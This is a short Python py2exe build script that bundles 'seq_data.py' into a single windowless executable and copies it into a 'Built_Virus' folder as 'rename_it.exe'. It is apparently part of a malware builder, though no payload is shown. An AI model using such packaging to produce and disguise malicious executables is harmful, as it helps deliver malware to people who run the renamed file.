from distutils.core import setup
import py2exe,sys
import shutil
import os

def back_dir(current_path):
                c=current_path.split('\\')
                new_path=''
                i=0
                while i<len(c)-1:
                        if i!=0:
                                new_path=new_path+"\\"+c[i]
                        else:
                                new_path=c[i]
                        i+=1
                os.chdir(new_path)





sys.argv.append('py2exe')

setup(
    options = {'py2exe': {'bundle_files': 1, 'compressed': True}},
    windows = [{'script': "seq_data.py"}],
    zipfile = None,
)

back_dir(os.getcwd())
pw=os.getcwd()
source=str(pw)+'\data\dist\seq_data.exe'
os.chdir('Built_Virus')
dest='rename_it.exe'
shutil.copy2(source,dest)




